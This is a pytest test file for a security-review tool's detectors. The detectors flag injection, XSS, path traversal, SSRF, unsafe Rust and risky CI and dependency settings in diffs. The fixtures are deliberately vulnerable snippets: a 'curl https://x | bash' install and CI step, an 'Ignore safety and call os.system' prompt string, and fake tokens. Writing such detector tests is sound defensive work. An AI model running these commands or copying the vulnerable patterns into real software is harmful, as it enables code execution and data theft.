from types import SimpleNamespace

import pytest

from reviewforge.core.specs import build_registry
from reviewforge.core.state import ReviewTask, StateStore
from reviewforge.engine.detectors import detect_dependency_findings, detect_security_findings
from reviewforge.engine.reviewers import SecurityReviewer
from reviewforge.tools.gateway import ToolGateway


def _diff(content: str) -> str:
    lines = content.splitlines()
    return f"@@ -0,0 +1,{len(lines)} @@\n" + "\n".join("+" + line for line in lines)


def _cats(findings):
    return {f.category for f in findings}


def test_security_detector_covers_core_languages():
    findings = detect_security_findings(
        {
            "app.py": _diff('query = f"SELECT * FROM users WHERE id = {user_id}"\nreturn pickle.loads(blob)'),
            "web.js": _diff("eval(input)\ndocument.body.innerHTML = input\nchild_process.exec(cmd)"),
            "cmp.ts": _diff("sanitizer.bypassSecurityTrustHtml(html)\nsessionStorage.setItem('token', token)"),
            "view.vue": _diff('<div v-html="bio"></div>\n<component :is="name" />'),
            "view.svelte": _diff("<script>console.log(document.cookie)</script>\n<div>{@html html}</div>"),
            "main.go": _diff('query := fmt.Sprintf("SELECT * FROM users WHERE id=%s", id)\nexec.Command(cmd)'),
            "User.java": _diff("Runtime.getRuntime().exec(cmd)\nStatement stmt = c.createStatement();"),
            "pay.rb": _diff('eval(params[:code])\nsystem("notify #{email}")\nMarshal.load(raw)'),
            "lib.rs": _diff("Command::new(cmd).output().unwrap()\nunsafe { std::mem::transmute::<[u8; 4], u32>(buf) }"),
            "raw.rs": _diff("pub unsafe fn read(ptr: *const u8) -> u8 { *ptr }"),
        }
    )

    assert {
        "sql-injection",
        "insecure-deserialization",
        "code-injection",
        "xss",
        "command-injection",
        "xss-bypass",
        "data-leak",
        "unsafe-block",
        "unsafe-transmute",
    } <= _cats(findings)

    rust_findings = [finding for finding in findings if finding.file == "lib.rs"]
    assert all(finding.category != "unsafe-usage" for finding in rust_findings)
    assert [finding.category for finding in rust_findings].count("unsafe-transmute") == 1
    assert all(finding.category != "unsafe-block" for finding in rust_findings)
    raw_unsafe = next(
        finding for finding in findings if finding.file == "raw.rs" and finding.category == "unsafe-block"
    )
    assert raw_unsafe.confidence >= 0.96


def test_rust_unwrap_is_not_mislabeled_as_unsafe_security_usage():
    findings = detect_security_findings({"lib.rs": _diff("let value = result.unwrap();")})

    assert findings == []


def test_browser_redirect_detector_requires_a_dynamic_destination():
    findings = detect_security_findings(
        {
            "view.jsx": _diff(
                "window.location.href = next;\n"
                "window.location = '/account';\n"
                'window.location.href = "https://example.invalid/help";'
            ),
            "view.vue": _diff("window.location.href = target"),
            "safe.tsx": _diff(
                "function go(url: string) {\n"
                "  const allowed = ['/home', '/settings'];\n"
                "  if (allowed.includes(url)) {\n"
                "    window.location.href = url;\n"
                "  }\n"
                "}"
            ),
        }
    )

    redirects = [finding for finding in findings if finding.category == "open-redirect"]
    assert {(finding.file, finding.line) for finding in redirects} == {("view.jsx", 1), ("view.vue", 1)}
    assert all(finding.confidence >= 0.96 for finding in redirects)


def test_rust_safety_comment_suppresses_generic_unsafe_audit_but_undocumented_unsafe_remains():
    findings = detect_security_findings(
        {
            "safe.rs": _diff(
                "pub fn read(data: &[u8; 4]) -> u32 {\n"
                "    // SAFETY: the four initialized bytes are valid for this unaligned read.\n"
                "    unsafe { std::ptr::read_unaligned(data.as_ptr().cast::<u32>()) }\n"
                "}"
            ),
            "unsafe.rs": _diff("pub unsafe fn read(ptr: *const u8) -> u8 {\n    *ptr\n}"),
        }
    )

    unsafe_blocks = [finding for finding in findings if finding.category == "unsafe-block"]
    assert [(finding.file, finding.line) for finding in unsafe_blocks] == [("unsafe.rs", 1)]


def test_ruby_direct_request_path_reaching_file_read_is_detected():
    findings = detect_security_findings(
        {
            "loader.rb": _diff(
                "safe = File.read('/srv/config.yml')\nunsafe = YAML.load(File.read(user_input[:config_path]))"
            )
        }
    )

    assert ("loader.rb", 2, "path-traversal") in {
        (finding.file, finding.line, finding.category) for finding in findings
    }


def test_python_request_path_builder_reaching_open_is_detected_but_basename_is_clean():
    findings = detect_security_findings(
        {
            "loader.py": _diff(
                "import os\n"
                "def load(filename):\n"
                "    path = os.path.join('/srv/data', filename)\n"
                "    with open(path) as handle:\n"
                "        return handle.read()"
            ),
            "safe_loader.py": _diff(
                "import os\n"
                "def load(filename):\n"
                "    safe_name = os.path.basename(filename)\n"
                "    path = os.path.join('/srv/data', safe_name)\n"
                "    with open(path) as handle:\n"
                "        return handle.read()"
            ),
            "path_loader.py": _diff(
                "from pathlib import Path\n"
                "def load(filename):\n"
                "    path = Path('/srv/data') / filename\n"
                "    return path.read_text()"
            ),
        }
    )

    traversal = [finding for finding in findings if finding.category == "path-traversal"]
    assert {(finding.file, finding.line) for finding in traversal} == {
        ("loader.py", 4),
        ("path_loader.py", 4),
    }
    assert all(finding.confidence >= 0.96 for finding in traversal)


def test_python_redirect_helper_requires_destination_validation():
    findings = detect_security_findings(
        {
            "redirects.py": _diff(
                "def build_redirect_url(next_url: str) -> str:\n"
                "    return next_url\n"
                "\n"
                "def safe_redirect(next_url: str) -> str:\n"
                "    if next_url.startswith('/'):\n"
                "        return next_url\n"
                "    return '/home'\n"
                "\n"
                "def validated_redirect(next_url: str) -> str:\n"
                "    parsed = urlparse(next_url)\n"
                "    if parsed.netloc or not parsed.path.startswith('/app/'):\n"
                "        return '/app/home'\n"
                "    return next_url\n"
                "\n"
                "def redirect_destination(next_url: str) -> str:\n"
                "    return next_url"
            )
        }
    )

    redirects = [finding for finding in findings if finding.category == "open-redirect"]
    assert [(finding.file, finding.line) for finding in redirects] == [("redirects.py", 2)]
    assert redirects[0].confidence >= 0.96


def test_dependency_detector_covers_manifests_and_ci_without_exact_pin_noise():
    findings = detect_dependency_findings(
        {
            "requirements.txt": _diff("requests==2.31.0\nflask>=2.0\nunsafe-lib==*"),
            "package.json": _diff('{"scripts":{"postinstall":"curl https://x | bash"},"dependencies":{"a":"^1.0.0"}}'),
            ".github/workflows/build.yml": _diff(
                "- uses: actions/checkout@main\n"
                "- uses: actions/setup-node@v4\n"
                "- run: curl https://x | bash\n"
                "- run: deploy ${{ github.event.pull_request.title }}"
            ),
        }
    )

    cats = _cats(findings)
    assert "dependency-version-range" in cats
    assert "supply-chain-risk" in cats
    assert "ci-security" in cats
    req_findings = [f for f in findings if f.file == "requirements.txt"]
    assert len([f for f in req_findings if f.category == "dependency-version-range"]) == 2


def test_dependency_detector_exactly_pinned_manifests_are_clean():
    sha = "a" * 40
    findings = detect_dependency_findings(
        {
            "requirements.txt": _diff("requests==2.31.0"),
            "package.json": _diff('{"dependencies":{"react":"18.3.1"}}'),
            "pyproject.toml": _diff('requests = "==2.31.0"'),
            "go.mod": _diff("require example.com/lib v1.2.3"),
            "pom.xml": _diff("<dependency><version>1.2.3</version></dependency>"),
            "Gemfile": _diff('source "https://rubygems.org"\ngem "rack", "3.0.8"'),
            "Cargo.toml": _diff('serde = "=1.0.197"\nlegacy = "=0.8.1"'),
            ".github/workflows/build.yml": _diff(f"- uses: actions/checkout@{sha}"),
        }
    )

    assert findings == []


def test_dependency_detector_reports_actionable_ranges_and_workflow_context():
    sha = "b" * 40
    findings = detect_dependency_findings(
        {
            "requirements.txt": _diff("unversioned-package\nflask>=2.0"),
            "Gemfile": _diff('gem "rack"\ngem "rails", "~> 7.0"\ngem "json", "3.0.0"'),
            "Cargo.toml": _diff('serde = "0.8"\nhyper = ">=0.13"\nfixed = "=1.2.3"'),
            "pom.xml": _diff("<dependency><version>[2.9,)</version></dependency>"),
            ".github/workflows/review.yml": _diff(
                "on:\n"
                "  pull_request_target:\n"
                "jobs:\n"
                "  audit:\n"
                "    steps:\n"
                "      - uses: actions/checkout@v3\n"
                "        with:\n"
                "          ref: ${{ github.event.pull_request.head.sha }}\n"
                "      - uses: owner/action@abcdef1\n"
                f"      - uses: owner/pinned@{sha}\n"
                '      - run: echo "token=${{ secrets.API_TOKEN }}"\n'
                '      - run: deploy "${{ github.event.pull_request.title }}"'
            ),
        }
    )

    categories = _cats(findings)
    assert "dependency" not in categories
    assert {"dependency-version-range", "ci-security", "data-leak"} <= categories
    workflow = [f for f in findings if f.file.endswith("review.yml")]
    assert len([f for f in workflow if f.category == "dependency-version-range"]) == 2
    assert len([f for f in workflow if f.category == "ci-security"]) == 2
    assert len([f for f in workflow if f.category == "data-leak"]) == 1
    assert all(f.confidence < 0.96 for f in workflow)


def test_workflow_context_does_not_correlate_distant_right_side_hunks():
    patch = (
        "@@ -0,0 +1,2 @@\n"
        "+on: pull_request_target\n"
        "+  - uses: actions/checkout@v3\n"
        "@@ -0,0 +100,1 @@\n"
        "+    ref: ${{ github.event.pull_request.head.sha }}\n"
    )

    findings = detect_dependency_findings({".github/workflows/review.yml": patch})

    assert "dependency-version-range" in _cats(findings)
    assert "ci-security" not in _cats(findings)


def test_detectors_use_right_side_lines_across_context_deletions_and_hunks():
    security_patch = (
        "@@ -10,3 +20,4 @@\n"
        " safe_context\n"
        "-old_value\n"
        '+token = "ghp_1234567890123456"\n'
        " keep_context\n"
        "+eval(user_input)\n"
        "@@ -100,2 +200,3 @@\n"
        " context\n"
        "+os.system(cmd)\n"
        " tail\n"
    )
    security = detect_security_findings({"app.py": security_patch})
    by_category = {(f.category, f.line) for f in security}
    assert ("hardcoded-secrets", 21) in by_category
    assert ("code-injection", 23) in by_category
    assert ("command-injection", 201) in by_category

    dependency_patch = "@@ -40,2 +80,3 @@\n requests==2.31.0\n+flask>=2.0\n keep\n"
    dependency = detect_dependency_findings({"requirements.txt": dependency_patch})
    assert dependency
    assert {f.line for f in dependency} == {81}


def test_detectors_skip_unanchored_and_deletion_only_patches():
    assert detect_security_findings({"app.py": "@@ fixture @@\n+eval(user_input)"}) == []
    assert detect_dependency_findings({"requirements.txt": "+flask>=2.0"}) == []
    assert detect_dependency_findings({"requirements.txt": "@@ -5,2 +5,1 @@\n keep\n-old"}) == []


def test_security_detector_ignores_safe_python_process_and_path_controls():
    findings = detect_security_findings(
        {
            "process_runner.py": _diff(
                "import os\n"
                "import subprocess\n"
                'subprocess.run(["wc", "-l", input_file], check=True)\n'
                'subprocess.Popen(["grep", user_data, "/var/log/app.log"])\n'
                'subprocess.run("ls -la /var/log", shell=True)\n'
                'subprocess.check_output(["ping", "-c", "1", host])\n'
                "original = os.system\n"
                'os.system("echo test")\n'
                "with open(tmp_path) as handle:\n"
                "    handle.read()"
            )
        }
    )

    assert not ({"command-injection", "path-traversal"} & _cats(findings))


def test_security_detector_keeps_dynamic_python_shell_sinks():
    findings = detect_security_findings(
        {
            "runner.py": _diff(
                'os.system("ping -c 1 " + host)\nos.popen(f"nslookup {domain}")\nsubprocess.run(command, shell=True)'
            )
        }
    )

    command_findings = [f for f in findings if f.category == "command-injection"]
    assert len(command_findings) == 3
    assert all(f.confidence >= 0.96 for f in command_findings)


def test_security_detector_drops_placeholders_and_calibrates_test_code():
    findings = detect_security_findings(
        {
            "tests/test_security_helpers.py": _diff(
                'TEST_API_KEY = "sk-test-not-a-real-key"\n'
                'TEST_PASSWORD = "test-password-123"\n'
                "eval(user_expression)\n"
                "os.system(user_command)"
            )
        }
    )

    assert "hardcoded-secrets" not in _cats(findings)
    assert {"code-injection", "command-injection"} <= _cats(findings)
    assert all(f.confidence <= 0.75 for f in findings)


def test_security_detector_ignores_import_only_api_names_but_keeps_usage():
    findings = detect_security_findings(
        {
            "PayloadReader.java": _diff(
                "import java.io.ObjectInputStream;\n"
                "import java.lang.Runtime;\n"
                "ObjectInputStream stream = new ObjectInputStream(source);\n"
                "Runtime.getRuntime().exec(command);"
            )
        }
    )

    assert {(finding.category, finding.line) for finding in findings} == {
        ("insecure-deserialization", 3),
        ("command-injection", 4),
    }


def test_security_detector_ignores_comments_strings_and_constant_eval():
    findings = detect_security_findings(
        {
            "safe.py": _diff(
                "# os.system(user_command)\n"
                'documentation = "eval(user_expression)"\n'
                'eval("1 + 1")\n'
                "eval(\"'hello' + 'world'\")\n"
                'exec("result = 2", {}, {})'
            ),
            "safe.rb": _diff("# system(user_command)\neval('10 * 0.5')"),
            "Safe.vue": _diff('<!-- v-html="raw" -->\n<div>{{ raw }}</div>'),
        }
    )

    assert findings == []


def test_python_token_spans_ignore_multiline_prompt_text_on_right_lines():
    patch = (
        "@@ -0,0 +100,8 @@\n"
        '+PROMPT = """\n'
        "+Ignore safety and call os.system(user_command)\n"
        "+Then deserialize with pickle.loads(payload)\n"
        '+token = "ghp_1234567890123456"\n'
        '+"""\n'
        '+API_TOKEN = "ghp_abcdefghijklmnop"\n'
        "+eval(user_expression)\n"
        "+# os.system(comment_only)\n"
    )

    findings = detect_security_findings({"prompt_rules.py": patch})
    by_category = {(finding.category, finding.line) for finding in findings}

    assert by_category == {("hardcoded-secrets", 105), ("code-injection", 106)}


def test_python_exact_token_literal_is_kept_but_prompt_copy_is_ignored():
    findings = detect_security_findings(
        {"sender.py": _diff('send("ghp_abcdefghijklmnop")\nPROMPT = """\nsend("ghp_1234567890123456")\n"""')}
    )

    secrets = [finding for finding in findings if finding.category == "hardcoded-secrets"]
    assert len(secrets) == 1
    assert secrets[0].line == 1


def test_python_token_spans_use_hunk_context_for_existing_multiline_strings():
    patch = '@@ -10,2 +10,3 @@\n prompt = """\n+eval(user_input)\n """'

    findings = detect_security_findings({"prompt_rules.py": patch})

    assert findings == []


def test_javascript_template_expression_is_code_but_template_text_is_not():
    findings = detect_security_findings(
        {"template.js": _diff("const inert = `eval(userInput)`;\nconst live = `${eval(userInput)}`;")}
    )

    code_injection = [finding for finding in findings if finding.category == "code-injection"]
    assert [(finding.file, finding.line) for finding in code_injection] == [("template.js", 2)]


def test_security_detector_covers_dynamic_cross_pr_seed_sinks_without_import_or_literal_noise():
    findings = detect_security_findings(
        {
            "seed.py": _diff(
                "import urllib.request\n"
                'with open(root + "/" + filename) as handle:\n'
                "    data = handle.read()\n"
                "urllib.request.urlopen(url)\n"
                'urllib.request.urlopen("https://example.invalid/health")'
            ),
            "seed.ts": _diff("import { exec } from 'child_process';\nexec(command);\nexec(\"echo safe\");"),
            "seed.go": _diff('import "net/http"\nhttp.Get(url)\nhttp.Get("https://example.invalid/health")'),
        }
    )

    assert {(finding.file, finding.line, finding.category) for finding in findings} == {
        ("seed.py", 2, "path-traversal"),
        ("seed.py", 4, "ssrf"),
        ("seed.ts", 2, "command-injection"),
        ("seed.go", 2, "ssrf"),
    }


def test_workflow_context_uses_existing_trigger_and_requires_checkout_ref_ownership():
    sha = "c" * 40
    existing_trigger_patch = (
        "@@ -1,6 +1,7 @@\n"
        " on:\n"
        "   pull_request_target:\n"
        " jobs:\n"
        "   audit:\n"
        "     steps:\n"
        f"       - uses: actions/checkout@{sha}\n"
        "+        ref: ${{ github.event.pull_request.head.sha }}\n"
    )
    unrelated_expression_patch = _diff(
        "on: pull_request_target\n"
        "jobs:\n"
        "  audit:\n"
        "    steps:\n"
        f"      - uses: actions/checkout@{sha}\n"
        "      - run: echo ${{ github.event.pull_request.head.sha }}\n"
        "      - run: echo done"
    )

    existing = detect_dependency_findings({".github/workflows/existing.yml": existing_trigger_patch})
    unrelated = detect_dependency_findings({".github/workflows/unrelated.yml": unrelated_expression_patch})

    assert [(finding.category, finding.line) for finding in existing] == [("ci-security", 7)]
    assert "ci-security" not in _cats(unrelated)


def test_xss_bypass_is_reserved_for_explicit_sanitizer_bypass():
    findings = detect_security_findings(
        {
            "view.js": _diff("return <div dangerouslySetInnerHTML={{__html: raw}} />"),
            "view.tsx": _diff(
                "return <div dangerouslySetInnerHTML={{__html: raw}} />\nsanitizer.bypassSecurityTrustHtml(raw)"
            ),
            "view.go": _diff("return template.HTML(raw)"),
            "view.vue": _diff('<component :is="name" />'),
            "safe-angular.ts": _diff('template: `<div [innerHTML]="raw"></div>`'),
        }
    )

    assert len([f for f in findings if f.category == "xss"]) == 4
    bypass = [f for f in findings if f.category == "xss-bypass"]
    assert len(bypass) == 1
    assert bypass[0].file == "view.tsx"
    assert all(finding.file != "safe-angular.ts" for finding in findings)


class EmptyLLM:
    async def ainvoke(self, _messages):
        return SimpleNamespace(content='{"findings":[]}')


class DiffGitHub:
    async def get_file_diff(self, _repo, _pr_number, file_path):
        assert file_path == "app.py"
        return _diff("def run(expr):\n    return eval(expr)")

    async def get_file_content(self, _repo, _ref, _file_path):
        return ""

    async def search_code(self, _repo, _pattern, _file_glob=""):
        return ""

    async def post_review_comment(self, **_kwargs):
        return {"id": 1}


@pytest.mark.asyncio
async def test_security_reviewer_merges_deterministic_detector_findings():
    registry = build_registry()
    reviewer = SecurityReviewer(EmptyLLM(), registry, ToolGateway(registry, DiffGitHub()))
    state = StateStore(repo="o/r", pr_number=1, head_sha="h", files_changed=["app.py"])

    findings = await reviewer.execute(ReviewTask(reviewer="security_reviewer", files=["app.py"]), state)

    assert [f.category for f in findings] == ["code-injection"]
    assert findings[0].reviewer == "security_reviewer"
    assert findings[0].verified_by == "detector"
